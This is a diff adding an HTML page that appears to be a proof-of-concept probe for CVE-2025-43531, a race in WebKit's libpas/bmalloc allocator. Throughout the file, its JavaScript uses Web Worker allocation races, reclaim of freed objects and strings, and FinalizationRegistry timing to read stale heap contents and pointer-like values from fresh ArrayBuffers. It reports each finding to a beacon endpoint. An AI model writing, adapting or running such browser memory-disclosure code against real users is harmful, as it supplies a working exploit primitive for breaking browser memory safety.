@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V593</title></head>
+<body><pre id="out">V593 — libpas concurrent race + stale buffer</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var u='/beacon/V593-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+}
+bk('BOOT','v593-libpas-race');
+say('V593: libpas concurrent race + stale buffer\n');
+
+/* =====================================================================
+ * STRATEGY: CVE-2025-43531 is a race in bmalloc/libpas concurrent
+ * allocation. Multiple threads alloc/free same size class simultaneously.
+ *
+ * Test 1: N Workers + main all alloc same size, check for non-zero ABs
+ * Test 2: Workers write magic, free, main allocs — check for stale magic
+ * Test 3: Object-then-AB reclaim — free JSObjects, alloc ABs, scan for
+ *          non-zero content that might be stale JSCell/butterfly data
+ * Test 4: String-then-AB — create many strings, let them GC, alloc ABs
+ * Test 5: Rapid alloc/dealloc with FinalizationRegistry timing
+ * =====================================================================
+ */
+
+var SIZES = [48, 64, 96, 128, 192, 256, 400, 512, 768, 1024, 1600, 3200, 6400];
+var NW = 6;
+
+/* ---------- T1: Concurrent multi-worker AB race ---------- */
+say('=== T1: Multi-worker concurrent race ===');
+
+var t1Code = 'self.onmessage=function(e){' +
+  'var sz=e.data.sz,n=e.data.n,tid=e.data.tid;' +
+  'var hits=0,first="";' +
+  'for(var i=0;i<n;i++){' +
+  '  var ab=new ArrayBuffer(sz);' +
+  '  var u=new Uint8Array(ab);' +
+  '  for(var j=0;j<sz;j++){' +
+  '    if(u[j]!==0){' +
+  '      hits++;' +
+  '      if(!first)first=sz+":"+j+":"+u[j];' +
+  '      break;' +
+  '    }' +
+  '  }' +
+  '  for(var j=0;j<sz;j++)u[j]=0xA0+tid;' +
+  '}' +
+  'self.postMessage({tid:tid,sz:sz,hits:hits,first:first});' +
+'};';
+var t1Blob = new Blob([t1Code],{type:'application/javascript'});
+var t1URL = URL.createObjectURL(t1Blob);
+
+var t1Done = 0;
+var t1TotalHits = 0;
+var t1Hits = [];
+var t1SizeIdx = 0;
+
+function t1NextSize() {
+  if (t1SizeIdx >= SIZES.length) {
+    bk('T1-DONE', 'total='+t1TotalHits+'|hits='+t1Hits.length);
+    say('T1 done: ' + t1TotalHits + ' non-zero ABs');
+    if (t1Hits.length > 0) {
+      for (var i = 0; i < Math.min(t1Hits.length, 5); i++) {
+        say('  HIT: ' + t1Hits[i]);
+        bk('T1-HIT', t1Hits[i]);
+      }
+    }
+    startT2();
+    return;
+  }
+  var sz = SIZES[t1SizeIdx];
+  t1Done = 0;
+  var ws = [];
+  for (var w = 0; w < NW; w++) {
+    var wk = new Worker(t1URL);
+    wk.onmessage = function(ev) {
+      var r = ev.data;
+      if (r.hits > 0) {
+        t1TotalHits += r.hits;
+        t1Hits.push('tid='+r.tid+'|sz='+r.sz+'|n='+r.hits+'|f='+r.first);
+      }
+      t1Done++;
+      if (t1Done >= NW) {
+        for (var i = 0; i < ws.length; i++) ws[i].terminate();
+        t1SizeIdx++;
+        setTimeout(t1NextSize, 10);
+      }
+    };
+    ws.push(wk);
+  }
+  // Also race from main thread
+  var mainABs = [];
+  for (var i = 0; i < 100; i++) mainABs.push(new ArrayBuffer(sz));
+  // Launch workers simultaneously
+  for (var w = 0; w < ws.length; w++) {
+    ws[w].postMessage({sz:sz, n:500, tid:w});
+  }
+  // Check main ABs
+  for (var i = 0; i < mainABs.length; i++) {
+    var u = new Uint8Array(mainABs[i]);
+    for (var j = 0; j < sz; j++) {
+      if (u[j] !== 0) {
+        t1TotalHits++;
+        t1Hits.push('main|sz='+sz+'|i='+i+'|j='+j+'|v='+u[j]);
+        break;
+      }
+    }
+  }
+  mainABs = null;
+}
+
+/* ---------- T2: Write-free-realloc stale detection ---------- */
+function startT2() {
+  say('\n=== T2: Write-free-realloc stale ===');
+  bk('T2-START', 'write-free-realloc');
+
+  var t2Code = 'self.onmessage=function(e){' +
+    'var sz=e.data.sz,n=e.data.n,magic=e.data.magic;' +
+    'for(var i=0;i<n;i++){' +
+    '  var ab=new ArrayBuffer(sz);' +
+    '  var u=new Uint8Array(ab);' +
+    '  for(var j=0;j<sz;j++)u[j]=magic;' +
+    '}' +
+    'self.postMessage("done");' +
+  '};';
+  var t2Blob = new Blob([t2Code],{type:'application/javascript'});
+  var t2URL = URL.createObjectURL(t2Blob);
+
+  var t2Hits = [];
+  var t2Si = 0;
+
+  function t2Next() {
+    if (t2Si >= SIZES.length) {
+      bk('T2-DONE', 'hits='+t2Hits.length);
+      say('T2 done: ' + t2Hits.length + ' stale detections');
+      if (t2Hits.length > 0) {
+        for (var i = 0; i < Math.min(t2Hits.length, 5); i++) {
+          say('  STALE: ' + t2Hits[i]);
+          bk('T2-HIT', t2Hits[i]);
+        }
+      }
+      startT3();
+      return;
+    }
+    var sz = SIZES[t2Si];
+    var ws = [];
+    for (var w = 0; w < NW; w++) {
+      var wk = new Worker(t2URL);
+      ws.push(wk);
+    }
+    var done = 0;
+    for (var w = 0; w < ws.length; w++) {
+      ws[w].onmessage = function() {
+        done++;
+        if (done >= NW) {
+          for (var i = 0; i < ws.length; i++) ws[i].terminate();
+          // Workers wrote 0xBB then freed. Main thread allocs same size.
+          for (var i = 0; i < 200; i++) {
+            var ab = new ArrayBuffer(sz);
+            var u = new Uint8Array(ab);
+            for (var j = 0; j < sz; j++) {
+              if (u[j] === 0xBB) {
+                t2Hits.push('sz='+sz+'|i='+i+'|j='+j);
+                break;
+              }
+              if (u[j] !== 0) {
+                t2Hits.push('sz='+sz+'|i='+i+'|j='+j+'|v='+u[j]);
+                break;
+              }
+            }
+          }
+          t2Si++;
+          setTimeout(t2Next, 10);
+        }
+      };
+      ws[w].postMessage({sz:sz, n:500, magic:0xBB});
+    }
+  }
+  t2Next();
+}
+
+/* ---------- T3: Object-heap-then-AB reclaim ---------- */
+function startT3() {
+  say('\n=== T3: Object heap → AB reclaim ===');
+  bk('T3-START', 'obj-reclaim');
+
+  // Create many JS objects of varying complexity
+  var objs = [];
+  for (var i = 0; i < 5000; i++) {
+    var o = {};
+    o['p'+i] = i;
+    o.fn = function(x){return x+1;};
+    o.arr = [i, i+1, i+2];
+    objs.push(o);
+  }
+  // Release all — their JSCells go back to GC
+  objs = null;
+
+  // Pressure GC heavily
+  for (var p = 0; p < 10; p++) {
+    var w = [];
+    for (var i = 0; i < 500; i++) w.push(new ArrayBuffer(4096));
+    w = null;
+  }
+
+  // Now alloc ABs of JSCell-relevant size classes and scan with BigUint64Array
+  var t3Ptrs = [];
+  var SCAN_SIZES = [48, 64, 96, 128, 256];
+
+  for (var si = 0; si < SCAN_SIZES.length; si++) {
+    var sz = SCAN_SIZES[si];
+    for (var i = 0; i < 200; i++) {
+      var ab = new ArrayBuffer(sz);
+      try {
+        var bv = new BigUint64Array(ab);
+        for (var k = 0; k < bv.length; k++) {
+          if (bv[k] !== 0n) {
+            var v = bv[k];
+            var hi = Number(v >> 32n);
+            t3Ptrs.push('sz='+sz+'|i='+i+'|k='+k+'|v=0x'+v.toString(16)+'|hi=0x'+hi.toString(16));
+            if (t3Ptrs.length >= 20) break;
+          }
+        }
+      } catch(e) {
+        if (i===0) say('BigUint64Array err: '+e.name);
+      }
+      if (t3Ptrs.length >= 20) break;
+    }
+    if (t3Ptrs.length >= 20) break;
+  }
+
+  bk('T3-DONE', 'ptrs='+t3Ptrs.length);
+  say('T3 object reclaim: ' + t3Ptrs.length + ' non-zero qwords');
+  if (t3Ptrs.length > 0) {
+    for (var i = 0; i < Math.min(t3Ptrs.length, 8); i++) {
+      say('  PTR: ' + t3Ptrs[i]);
+    }
+    bk('T3-PTRS', t3Ptrs.slice(0,5).join('|'));
+  }
+  startT4();
+}
+
+/* ---------- T4: String reclaim — create strings, GC, alloc AB ---------- */
+function startT4() {
+  say('\n=== T4: String → AB reclaim ===');
+  bk('T4-START', 'string-reclaim');
+
+  // Create many strings of specific lengths (StringImpl allocs from FastMalloc)
+  var strs = [];
+  var STR_LENS = [32, 64, 128, 256, 512];
+  for (var li = 0; li < STR_LENS.length; li++) {
+    var len = STR_LENS[li];
+    for (var i = 0; i < 500; i++) {
+      var s = '';
+      for (var j = 0; j < len; j++) s += String.fromCharCode(65 + (j%26));
+      strs.push(s);
+    }
+  }
+  // Release
+  strs = null;
+
+  // GC pressure
+  for (var p = 0; p < 5; p++) {
+    var w = [];
+    for (var i = 0; i < 300; i++) w.push(new ArrayBuffer(4096));
+    w = null;
+  }
+
+  // Scan ABs for residual string data (ASCII patterns)
+  var t4Hits = [];
+  for (var li = 0; li < STR_LENS.length; li++) {
+    var sz = STR_LENS[li] * 2; // UTF-16 = 2 bytes per char
+    for (var i = 0; i < 100; i++) {
+      var ab = new ArrayBuffer(sz);
+      var u8 = new Uint8Array(ab);
+      var nonzero = 0;
+      var ascii = '';
+      for (var j = 0; j < Math.min(sz, 32); j++) {
+        if (u8[j] !== 0) {
+          nonzero++;
+          if (u8[j] >= 0x20 && u8[j] < 0x7F) ascii += String.fromCharCode(u8[j]);
+          else ascii += '.';
+        }
+      }
+      if (nonzero > 0) {
+        t4Hits.push('sz='+sz+'|nz='+nonzero+'|ascii='+ascii);
+        if (t4Hits.length >= 10) break;
+      }
+    }
+    if (t4Hits.length >= 10) break;
+  }
+
+  bk('T4-DONE', 'hits='+t4Hits.length);
+  say('T4 string reclaim: ' + t4Hits.length + ' non-zero ABs');
+  if (t4Hits.length > 0) {
+    for (var i = 0; i < Math.min(t4Hits.length, 5); i++) {
+      say('  STR: ' + t4Hits[i]);
+      bk('T4-HIT', t4Hits[i]);
+    }
+  }
+  startT5();
+}
+
+/* ---------- T5: FinalizationRegistry-guided race ---------- */
+function startT5() {
+  say('\n=== T5: FinReg-guided race ===');
+  bk('T5-START', 'finreg-race');
+
+  if (typeof FinalizationRegistry === 'undefined') {
+    bk('T5-DONE', 'NO_FINREG');
+    say('No FinalizationRegistry');
+    finish();
+    return;
+  }
+
+  // Strategy: register an object wrapping an AB. When GC'd, the FinReg
+  // callback fires. In that callback, immediately alloc a new AB of the
+  // same size — this MIGHT reclaim the just-freed backing memory before
+  // zeroing completes (if there's a race window between free and zero).
+
+  var SIZE = 256;
+  var ROUNDS = 200;
+  var t5Hits = [];
+  var t5Done = 0;
+
+  var fr = new FinalizationRegistry(function(token) {
+    // Object was just collected. Alloc same size immediately.
+    var ab = new ArrayBuffer(SIZE);
+    var u8 = new Uint8Array(ab);
+    var nz = 0;
+    for (var j = 0; j < SIZE; j++) {
+      if (u8[j] !== 0) nz++;
+    }
+    if (nz > 0) {
+      t5Hits.push('round='+token+'|nz='+nz);
+    }
+    t5Done++;
+    if (t5Done >= ROUNDS) {
+      bk('T5-DONE', 'hits='+t5Hits.length+'|done='+t5Done);
+      say('T5 FinReg race: ' + t5Hits.length + ' stale ABs');
+      if (t5Hits.length > 0) {
+        for (var i = 0; i < Math.min(t5Hits.length, 5); i++) {
+          say('  FINREG: ' + t5Hits[i]);
+          bk('T5-HIT', t5Hits[i]);
+        }
+      }
+      finish();
+    }
+  });
+
+  for (var i = 0; i < ROUNDS; i++) {
+    var obj = {data: new ArrayBuffer(SIZE), round: i};
+    var u = new Uint8Array(obj.data);
+    for (var j = 0; j < SIZE; j++) u[j] = 0xCC;
+    fr.register(obj, i);
+    obj = null;
+  }
+
+  // Pressure GC
+  var gcTimer = setInterval(function() {
+    var w = [];
+    for (var i = 0; i < 200; i++) w.push(new ArrayBuffer(4096));
+    w = null;
+    if (t5Done >= ROUNDS) clearInterval(gcTimer);
+  }, 50);
+
+  // Timeout
+  setTimeout(function() {
+    if (t5Done < ROUNDS) {
+      clearInterval(gcTimer);
+      bk('T5-TIMEOUT', 'done='+t5Done+'|hits='+t5Hits.length);
+      say('T5 timeout: '+t5Done+'/'+ROUNDS+' collected, '+t5Hits.length+' hits');
+      finish();
+    }
+  }, 20000);
+}
+
+function finish() {
+  say('\n=== V593 COMPLETE ===');
+  bk('DONE', 'v593-complete');
+  setTimeout(function(){ bk('DONE', 'v593-complete'); }, 5000);
+}
+
+// Start
+say('Starting concurrent race tests...\n');
+t1NextSize();
+
+</script></body></html>
